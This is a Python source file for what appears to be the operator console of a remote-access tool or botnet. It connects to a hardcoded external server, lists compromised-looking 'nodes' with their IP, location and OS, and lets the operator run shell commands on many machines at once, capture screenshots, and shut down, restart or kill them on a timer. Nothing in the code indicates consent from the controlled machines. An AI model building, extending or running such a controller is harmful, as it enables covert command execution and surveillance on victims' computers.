import socketio
import platform
import requests
import datetime
import subprocess
import os
from socket import gethostname
from time import sleep

screenshots_open_on_receive = True

authentication = {
    "token":""
}

nodes = []

io = socketio.Client();

def nl():
    print("")

def close():
    io.disconnect()
    exit()

def GetClients():
    io.emit("admin:getnodes", authentication);

def PrintNodes():
    nl()
    print("Clients (nodes) currently connected: " + str(len(nodes)))
    nl()
    print("---- ID ------- NAME --------- LOCATION -------- IP --------------- NODE ID ----------- OS --------\n")
    for i, node in enumerate(nodes):
        print("     " + str(i) + "     " + node['name'] + "    " + node['geolocation']['country'] + "       " + node['geolocation']['query'] + "     " + node['id'] + "    " + node['os'] + " " + node['os_release'] + "\n")
        nl()

def KillNode(node, timer):
    data = {
        "nodeid":node['id'],
        "timer":timer
    }
    io.emit("admin:kill_node", {**authentication, **data})

def ShutdownNode(node, timer):
    data = {
        "nodeid":node['id'],
        "timer":timer
    }
    io.emit("admin:shutdown_node", {**authentication, **data})

def RestartNode(node, timer):
    data = {
        "nodeid":node['id'],
        "timer":timer
    }
    io.emit("admin:restart_node", {**authentication, **data})

def GetScreenshots(node):
    data = {
        "nodeid":node['id']
    }

    io.emit("admin:screenshot", {**authentication, **data})


def RunCommandOnNode(node, command):
    io.emit("admin:run_command", {
        "nodeid":node['id'],
        "command":command
    });

def MainUI():
    if len(nodes) == 0:
        print("There are currently no nodes connected. Press enter to refresh.")
        input()
        GetClients()
        return
    PrintNodes()
    selectedNodes = []
    for x in input("Select nodes (by ID) to control, separated by comma, or type 'exit' to log out : ").split(','):
        if x.lower().strip() == "exit":
            close()

        elif x.isnumeric() == False:
            print("Invalid selection. Please select one or more devices with their cooresponding ID.")
            MainUI();
            return

        elif int(x) < 0 or int(x) > (len(nodes) - 1):
            print("Invalid selection. Please select a device or multiple device between IDs 0 and " + str(len(nodes) - 1) + ".")
            MainUI();
            return

        else:
            selectedNodes.append(int(x))




    if len(selectedNodes) > 0:
        option = input("Available Actions - [T]erminal, [K]ill Switch, [P]ower off, [R]estart, [S]creenshot, OR [C]ancel: ")

        if option.lower() == 't':
            node1_os = nodes[selectedNodes[0]]['os']
            if not all(nodes[node]['os'] == node1_os for node in selectedNodes):
                print("It worked!")
                opSystems = list(set([nodes[node]['os'] for node in selectedNodes]))

                print("\nNote: you have selected nodes with different OS types.")
                print("Operating Systems Selected: ", end='')
                for i, opSys in enumerate(opSystems):
                    print(opSys, end='')
                    if i != len(opSystems) - 1:
                        print(", ")
                    else:
                        print(" and ")
                verdict = input("Are you sure you still want to run a linked terminal across asymmetrical systems? Some commands might not work on both systems. (Y/N)").lower()
                if verdict == 'n':
                    GetClients()
                    return

            print("Type EXIT to escape from terminal.")
            print("(TUNNEL) >>_ ",end="")
            while True:
                command = input()
                if command.lower() == 'exit':
                    GetClients()

                    return

                for i in selectedNodes:
                    RunCommandOnNode(nodes[i], command)
        elif option.lower() == 'k':
            timer = input("After how many seconds (BLANK = 0): ").strip()
            if timer == "":
                timer = 0
            else:
                timer = int(timer)

            for i in selectedNodes:
                KillNode(nodes[i], timer)
            print(".")
            sleep(1)
            print(".")
            sleep(1)
            print(".")
            sleep(1)
            print('Success! Returning to main menu...')
            GetClients()
            return

        elif option.lower() == 'p':
            timer = input("After how many seconds (BLANK = 0): ").strip()
            if timer == "":
                timer = 0
            else:
                timer = int(timer)

            for i in selectedNodes:
                ShutdownNode(nodes[i], timer)

            GetClients()
            return

        elif option.lower() == 'r':
            timer = input("After how many seconds (BLANK = 0): ").strip()
            if timer == "":
                timer = 0
            else:
                timer = int(timer)

            for i in selectedNodes:
                RestartNode(nodes[i], timer)

            GetClients()
            return

        elif option.lower() == "c":
            GetClients()
            return

        elif option.lower() == "s":
            # Screenshot
            print("Getting screenshots. This may take some time...")
            for i in selectedNodes:
                GetScreenshots(nodes[i])

            GetClients()
            return


        else:
            print("Invalid selection. Try again.")
            GetClients()
            return


    else:
        print("You did not select any nodes. Try again.")
        GetClients()
        return





# -------------------------------
username = input("Input username : ")
password = input("Input password : ")

@io.event
def connect():
    # Send data, as message: init
    geo_r = requests.get("http://ip-api.com/json/")
    geodata = geo_r.json()

    client_data = {
        "type":"admin",
        "os":platform.system() + " " + platform.release(),
        "geolocation":geodata,
        "name":gethostname(),
        "username":username,
        "password":password
    }

    io.emit('init', client_data)

@io.event
def disconnect():
    # Work out how do quit app
    quit()

@io.event
def token(data):
    authentication["token"] = data
    print("Logged in. Token = " + data)
    GetClients()

@io.event
def clients(clients):
    global nodes
    nodes = clients
    MainUI()

@io.event
def screenshot(data):
    node = data['node']
    # print("SCREENSHOT from node: '" + node['name'] + "', saving image of: '" + data['base_filename'].split(".")[0] + "' in folder.")
    file_suffix = node['name'] + datetime.datetime.now().strftime("%d-%m-%y--%H-%M-%S")
    # Write to file
    screenSplit = data['base_filename'].split("-")
    screenNo = screenSplit[len(screenSplit) - 1].split(".")[0]
    final_filename = file_suffix + "-" + data['base_filename']

    abs_dir = os.getcwd() + "\\" + node['name'] + "\\" + "screen-" + screenNo
    if not os.path.exists(abs_dir):
        os.makedirs(abs_dir)

    dir_to_file = abs_dir + "\\" + final_filename

    with open(dir_to_file, 'wb') as file:
        file.write(data['raw_file'])

    if screenshots_open_on_receive:
        subprocess.Popen(["start",dir_to_file], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)


@io.event
def console_output(obj):
    if obj['out'].strip() != "":
        print("\n\n" + obj['name'] + " said:\n" + obj['out'])

    else:
        print(obj['name'] + " said nothing.")
    command = print("\n(TUNNEL) >>_ ", end='')

try:
    io.connect("http://jz-software.pw:1010")
except:
    print("Failed to connect to server. Shutting down in 3 seconds...")
    sleep(3)
    exit()
